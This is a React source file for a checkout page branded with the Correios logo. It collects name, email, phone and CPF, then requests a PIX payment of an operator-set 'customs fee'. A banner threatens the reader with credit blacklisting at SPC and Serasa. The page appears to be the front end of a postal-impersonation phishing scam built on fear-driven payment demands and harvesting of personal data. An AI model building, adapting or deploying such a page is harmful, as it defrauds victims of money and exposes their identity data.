import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { CheckoutForm } from "@/components/checkout/CheckoutForm";
import { OrderSummary } from "@/components/checkout/OrderSummary";
import { PhoneConfirmModal } from "@/components/checkout/PhoneConfirmModal";
import { PixPayment } from "@/components/checkout/PixPayment";
import logo from "@/assets/correios-logo.png";

interface CustomerData {
  name: string;
  email: string;
  phone: string;
  cpf: string;
}

const Index = () => {
  const [customerData, setCustomerData] = useState<CustomerData | null>(null);
  const [showPhoneModal, setShowPhoneModal] = useState(false);
  const [confirmedPhone, setConfirmedPhone] = useState("");
  const [showPayment, setShowPayment] = useState(false);
  const [totalAmount, setTotalAmount] = useState(214.80);
  const [loadingAmount, setLoadingAmount] = useState(true);

  useEffect(() => {
    fetchAmount();
  }, []);

  const fetchAmount = async () => {
    try {
      const { data, error } = await supabase
        .from("settings")
        .select("value")
        .eq("key", "checkout_amount")
        .single();

      if (error) throw error;

      if (data) {
        setTotalAmount(parseFloat(data.value));
      }
    } catch (error) {
      console.error("Erro ao buscar valor:", error);
    } finally {
      setLoadingAmount(false);
    }
  };

  const handleCustomerDataFilled = (data: CustomerData) => {
    setCustomerData(data);
    setShowPhoneModal(true);
  };

  const handlePhoneConfirm = (phone: string) => {
    setConfirmedPhone(phone);
    setShowPhoneModal(false);
    setShowPayment(true);
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header with Logo */}
      <div className="bg-white shadow-sm py-6">
        <div className="container mx-auto px-4">
          <img 
            src={logo} 
            alt="Correios" 
            className="h-12 w-auto"
          />
        </div>
      </div>

      {/* Important Banner */}
      <div className="bg-[#3d4c5f] text-white py-4">
        <div className="container mx-auto px-4">
          <p className="text-center text-sm">
            <strong>IMPORTANTE:</strong> O não pagamento da taxa alfandegária até o prazo determinado, ocasionará a DEVOLUÇÃO. E SEU NOME SERÁ <strong>NEGATIVADO NO SPC E SERASA</strong>, após efetuar o pagamento fique nessa tela.
          </p>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">

        {/* Main Content */}
        <div className="grid lg:grid-cols-2 gap-8 max-w-6xl mx-auto">
          <div className="space-y-6">
            {!showPayment ? (
              <CheckoutForm onCustomerDataFilled={handleCustomerDataFilled} />
            ) : (
              <PixPayment 
                amount={totalAmount}
                customerName={customerData?.name || "Cliente"}
                customerEmail={customerData?.email || ""}
                customerCpf={customerData?.cpf || ""}
              />
            )}
          </div>

          <div>
            <OrderSummary amount={totalAmount} />
          </div>
        </div>

        {/* Phone Confirmation Modal */}
        {customerData && (
          <PhoneConfirmModal
            isOpen={showPhoneModal}
            initialPhone={customerData.phone}
            onConfirm={handlePhoneConfirm}
            onCancel={() => setShowPhoneModal(false)}
          />
        )}

      </div>
    </div>
  );
};

export default Index;
